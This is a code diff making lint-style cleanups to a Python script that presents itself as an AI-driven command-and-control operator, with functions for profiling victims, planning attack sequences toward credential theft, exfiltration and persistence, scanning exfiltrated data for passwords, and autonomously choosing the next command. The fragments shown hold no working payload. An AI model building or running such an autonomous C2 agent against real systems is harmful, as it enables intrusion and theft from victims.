@@ -4,11 +4,8 @@ Autonomous C2 Operator with intelligent decision-making.
 Analyzes victim data, plans attacks, and extracts intelligence.
 """
 
-import json
 import time
-import base64
 from datetime import datetime
-from typing import List, Dict, Optional
 
 
 class CyberReconAIAgent:
@@ -49,7 +46,7 @@ class CyberReconAIAgent:
 
     # ======== 1. NATURAL LANGUAGE COMMAND PARSING ========
 
-    def parse_natural_language(self, query: str) -> Dict:
+    def parse_natural_language(self, query: str) -> dict:
         """
         Convert natural language to structured C2 commands.
 
@@ -109,7 +106,7 @@ class CyberReconAIAgent:
 
     # ======== 2. VICTIM BEHAVIOR PROFILING ========
 
-    def analyze_victim(self, victim_data: Dict) -> Dict:
+    def analyze_victim(self, victim_data: dict) -> dict:
         """
         Build a psychological/technical profile of the victim.
         """
@@ -152,7 +149,7 @@ class CyberReconAIAgent:
 
     # ======== 3. AUTONOMOUS ATTACK PLANNING ========
 
-    def plan_attack_sequence(self, objective: str, victim_id: str) -> List[str]:
+    def plan_attack_sequence(self, objective: str, victim_id: str) -> list[str]:
         """
         Generate a multi-step attack plan based on objective.
 
@@ -196,7 +193,7 @@ class CyberReconAIAgent:
 
     # ======== 4. EXFILTRATED DATA ANALYSIS ========
 
-    def analyze_exfil(self, data_type: str, data: str) -> Dict:
+    def analyze_exfil(self, data_type: str, data: str) -> dict:
         """
         Analyze exfiltrated data for intelligence value.
         """
@@ -234,7 +231,7 @@ class CyberReconAIAgent:
                 if keyword in data.lower():
                     findings["sensitive_detected"] = True
                     findings["severity"] = "critical"
-                    findings["findings"].append(f"PASSWORD/CREDENTIAL PATTERN DETECTED")
+                    findings["findings"].append("PASSWORD/CREDENTIAL PATTERN DETECTED")
 
         elif data_type == "system_info":
             findings["findings"].append(f"System: {data}")
@@ -254,7 +251,7 @@ class CyberReconAIAgent:
 
     # ======== 5. AUTONOMOUS MODE ========
 
-    def autonomous_decision(self, victim_id: str, current_state: Dict) -> Optional[str]:
+    def autonomous_decision(self, victim_id: str, current_state: dict) -> str | None:
         """
         Decide the next best command autonomously.
         Returns command name or None if no action needed.
@@ -307,11 +304,11 @@ def main():
     import argparse
     parser = argparse.ArgumentParser(description="CyberRecon AI Agent")
     parser.add_argument("--c2", default="http://127.0.0.1:8443", help="C2 server URL")
-    parser.add_argument("--mode", choices=["parse", "plan", "analyze", "auto"], 
+    parser.add_argument("--mode", choices=["parse", "plan", "analyze", "auto"],
                         default="parse", help="Agent mode")
     parser.add_argument("--query", help="Natural language query")
     parser.add_argument("--victim-id", help="Target victim ID")
-    parser.add_argument("--objective", default="recon", 
+    parser.add_argument("--objective", default="recon",
                         help="Attack objective (recon/credentials/exfil/persist/full_compromise)")
     args = parser.parse_args()
 
@@ -330,7 +327,7 @@ def main():
 
     elif args.mode == "auto" and args.victim_id:
         print(f"[AI] Autonomous mode activated for {args.victim_id}")
-        print(f"[AI] Monitoring... (Ctrl+C to stop)")
+        print("[AI] Monitoring... (Ctrl+C to stop)")
         try:
             while True:
                 # In real implementation, poll C2 server for victim state
